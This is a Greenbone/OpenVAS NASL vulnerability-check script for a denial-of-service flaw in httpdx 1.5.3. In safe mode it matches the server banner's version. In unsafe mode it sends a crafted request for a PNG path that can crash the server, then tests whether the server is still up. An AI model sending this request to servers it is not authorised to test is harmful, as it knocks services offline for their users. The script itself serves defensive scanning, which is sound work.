# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100525");
  script_version("2023-10-27T16:11:32+0000");
  script_tag(name:"last_modification", value:"2023-10-27 16:11:32 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2010-03-11 12:36:18 +0100 (Thu, 11 Mar 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_name("httpdx PNG File Handling Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38638");

  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("httpdx/banner");

  script_tag(name:"summary", value:"httpdx is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to cause the server to stop
  responding, denying service to legitimate users.");

  script_tag(name:"affected", value:"httpdx 1.5.3, other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("version_func.inc");

port = http_get_port(default:80);
banner = http_get_remote_headers(port: port);

if(!banner || "httpdx/" >!< banner)
  exit(0);

if(safe_checks()) {
  version = eregmatch(pattern: "httpdx/([0-9.]+)", string: banner);
  if(isnull(version[1]))exit(0);
  if(version_is_equal(version: version[1], test_version: "1.5.3")) {
    security_message(port:port);
    exit(0);
  }
} else {

  if(http_is_dead(port:port))
    exit(0);

  url = string("GET /res~httpdx.conf/image/php.png");
  req = http_get(item:url, port:port);
  res = http_send_recv(port:port, data:req);

  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(0);
